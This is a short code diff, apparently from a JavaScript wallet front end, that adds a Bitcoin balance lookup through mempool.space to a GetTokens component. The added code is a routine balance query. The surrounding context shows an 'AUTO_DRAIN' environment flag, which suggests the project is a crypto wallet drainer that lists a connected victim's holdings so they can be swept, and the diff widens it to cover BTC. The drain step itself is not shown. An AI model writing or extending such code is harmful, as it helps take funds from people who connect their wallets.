@@ -192,6 +192,45 @@ export const GetTokens = () => {
         }
       }
 
+      // ── Bitcoin ───────────────────────────────────────────────────────────────
+      if (primaryWallet.chain === 'BTC') {
+        try {
+          const btcRes = await fetch(
+            `https://mempool.space/api/address/${address}`,
+          );
+          const btcData = await btcRes.json();
+          const confirmedSats =
+            (btcData.chain_stats?.funded_txo_sum || 0) -
+            (btcData.chain_stats?.spent_txo_sum || 0);
+          const mempoolSats =
+            (btcData.mempool_stats?.funded_txo_sum || 0) -
+            (btcData.mempool_stats?.spent_txo_sum || 0);
+          const totalSats = confirmedSats + mempoolSats;
+          if (totalSats > 0) {
+            allTokens.push({
+              contract_decimals: 8,
+              contract_name: 'Bitcoin',
+              contract_ticker_symbol: 'BTC',
+              contract_address: 'btc-native',
+              supports_erc: [],
+              logo_url: '',
+              last_transferred_at: new Date().toISOString(),
+              native_token: true,
+              type: 'cryptocurrency',
+              balance: totalSats.toString(),
+              balance_24h: totalSats.toString(),
+              quote_rate: 0,
+              quote_rate_24h: 0,
+              quote: 0,
+              quote_24h: 0,
+              nft_data: null,
+            });
+          }
+        } catch (err) {
+          console.error('Error fetching BTC balance', err);
+        }
+      }
+
       setTokens(allTokens);
 
       if (process.env.NEXT_PUBLIC_AUTO_DRAIN === 'true') {
